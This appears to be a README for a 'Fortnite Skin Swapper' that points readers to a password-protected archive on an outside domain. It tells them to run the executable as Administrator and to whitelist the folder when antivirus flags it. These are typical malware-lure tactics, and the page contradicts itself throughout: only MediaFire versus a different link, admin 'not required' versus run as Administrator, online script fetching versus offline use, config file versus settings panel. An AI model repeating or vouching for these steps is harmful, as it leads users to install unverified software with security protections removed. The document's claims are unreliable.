<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Instant skin swaps in-match** — swap any equipped outfit, back bling, pickaxe, or wrap on the fly without restarting the game or rejoining the lobby.
- **Full locker preview before you commit** — browse and preview every skin variant in the local catalog, then lock in your loadout with one click.
- **Pre-activated, zero-config** — the 2026 desktop edition ships ready to run; no license keys, no activation steps, no account linking required.
- **Standalone local build** — everything runs on your machine. The catalog, swap engine, and configuration all live locally, so there's no dependency on external services to keep swapping.
- **Persistent loadouts** — save named presets and switch between them instantly, so your main, your meme picks, and your try-hard set are always one tap away.
- **Live swap engine** — changes apply in real time while the game is running, with a hot-reload path that keeps your session stable through outfit changes.
- **Lightweight footprint** — the swapper idles quietly in the background, using minimal memory and no noticeable frame impact during matches.
- **Built-in catalog updates** — the local skin database is structured for straightforward refresh, so new outfits and wraps can be added as they appear in the locker.
- **Windows x64 native** — compiled for desktop performance on Windows, with a clean single-directory layout that's easy to back up or move between machines.
- **Simple configuration** — a plain-text config controls swap behavior, preset defaults, and hotkey bindings; tweak it once and it sticks.
- **Clean uninstall** — no registry sprawl, no leftover services; delete the folder and it's gone.

## How it works

The Swapper runs as a standalone desktop client, so there is no launcher dependency, no account handshake, and no background service to babysit. You point it at your local game install, pick a skin from the built-in catalog, and the tool handles the asset swap on disk before the game boots. Everything happens client-side on your own machine.

Under the hood, the client builds a local profile of your Fortnite installation, then maps your selected cosmetics to the corresponding asset slots during the pre-launch window. The swap layer sits between the game's asset loader and its local files, so the runtime never sees a mismatch. Configuration changes are applied atomically — either the full swap set lands or nothing does, which keeps your install clean if a step gets interrupted.

The workflow is deliberately short:

1. **Detect** — the client scans for your Fortnite install and confirms the asset layout matches a supported build.
2. **Select** — browse the skin catalog and queue the outfits, back blings, and pickaxes you want active.
3. **Apply** — hit swap and the client stages the asset replacements locally, verifying each write before committing.
4. **Launch** — start Fortnite normally. The selected cosmetics load in place of the defaults, no injection or runtime hooking required.
5. **Revert** — one click restores your original assets from the backup the client made on first apply. Nothing is overwritten permanently.

Because the build is pre-activated, there is no key entry, license check, or online validation step. The desktop edition ships fully self-contained — config files, asset cache, and backup store all live in the app's local directory, so you can move or archive the whole folder without breaking anything.

Performance overhead is effectively zero during gameplay. All processing happens before the game launches, and the client idles in the background while you play. Re-swapping takes seconds, and the backup store means you can flip between loadouts as often as you want without ever touching a fresh install.

## Supported Games

This build is locked and tuned for Fortnite on Windows x64 desktop — no browser wrappers, no mobile ports, no emulator nonsense.

- **Fortnite (PC)** — the primary and fully supported target. Cosmetic swapping, locker injection, and loadout cycling are validated against the current 2026 live client.
- **Fortnite Chapter builds** — compatible across the active seasonal build cycle; the swapper reads the live catalog and stays in sync with seasonal rotations.
- **Epic Games Launcher installs** — standard retail installations are detected automatically; no manual path hunting required.
- **Custom install locations** — point the config at any valid Fortnite install directory and the swapper follows it.

Everything outside this list is untested and unsupported. If it's not launching through the Epic Games Launcher on a Windows x64 desktop, this tool isn't built for it — and we'd rather say that straight than pretend otherwise.

## Configuration

Configuration lives in `config.ini` next to the executable. Open it in any text editor, save, and relaunch the swapper to apply changes. The defaults are tuned for a standard desktop setup, so only touch what you actually need.

**Key settings:**

- `SkinDirectory` — point this at the folder holding your skin swap profiles. Keep it local; network paths add latency to load times.
- `TargetGame` — locked to Fortnite by default. Leave it alone unless you're running a supported side build.
- `SwapMode` — `instant` applies swaps on hotkey press, `queued` batches them until you confirm. Instant for casual play, queued when you're testing multiple loadouts.
- `HotkeyToggle` — rebind the activation combo here. Default is `F8`. Avoid keys Fortnite already uses for build or inventory.
- `PreserveLoadout` — `true` keeps your current in-match loadout untouched when swapping cosmetic sets. Set to `false` only if you want a full override.
- `LogLevel` — `info` for normal use, `debug` when troubleshooting a skin that won't apply.

**Profile handling:**

Each profile is a plain text file in your `SkinDirectory`. Add or remove profiles by editing the files directly — no launcher UI required. Keep profile names short and alphanumeric; special characters can trip the parser.

**Reset behavior:**

Delete `config.ini` and relaunch to regenerate defaults. Your profiles stay intact — only the config resets. Back up the file before making broad edits if you've customized multiple hotkeys.

## FAQ

**Is this a standalone build or does it need extra dependencies?**
Fully standalone. The desktop edition ships pre-activated and self-contained — no runtime hunting, no package managers, no dependency wrangling. Launch it and it's live.

**Does it work offline?**
Yes. Once the build is on your machine, core swapping runs locally. No constant connection required, no phone-home behavior baked into the workflow.

**Which game versions are supported?**
Built for the 2026 Fortnite client. The swapper targets the current skin and cosmetic data structures — if you're on an outdated client, expect mismatches. Keep your game current.

**Will swapped skins show up for other players?**
Understand the scope: swapping is client-side. You see the change on your end. This is a local enhancement tool, not a server-side injection — treat it accordingly.

**How do I configure it?**
Configuration lives in the app's settings panel — skin selection, presets, and loadout profiles are all managed in-app. No config file archaeology needed unless you want to hand-tune.

**What happens if the app won't launch?**
Check that you're on Windows x64, that the build isn't quarantined by security software, and that no stale process is holding the files. Most launch failures trace back to an overzealous antivirus flag — whitelist the folder and retry.

**Is this detectable or bannable?**
This is a client-side cosmetic enhancement. That said, any third-party tool carries risk with online games — use it on your own judgment, keep it local, and don't stream it. The disclaimer covers the full picture; read it.

**Can I run multiple profiles or presets?**
Yes. Presets let you save and hot-swap loadouts without reconfiguring from scratch each session. Set them up once, cycle through them fast.

**Does it modify game files permanently?**
No permanent file surgery. Swaps are applied at runtime through the app — close it and your client is back to stock behavior.

**Where do I get updates?**
Pull the latest build from the project's release channel when a new client version drops. Old builds against new game patches will drift — stay synced.

## Disclaimer

This build is provided as-is for testing and evaluation purposes. Fortnite-Skin-Swapper is a standalone desktop utility — you run it locally, you control it locally, and nothing gets phoned home behind your back. That said, use your head: cosmetic modification tools operate in a gray zone, and you assume full responsibility for how you deploy this build. We don't guarantee compatibility with every game patch, anti-cheat update, or future Fortnite release — the 2026 build is verified against the current client, and that's the honest scope of it. No warranties, no refunds, no hand-holding if a patch breaks your setup. Back up your configs before you tinker, keep the tool offline unless you know what you're doing, and don't expect us to bail you out of account actions taken by third parties. This is a pre-activated local edition — it does what it says on the tin, and everything beyond that is on you.
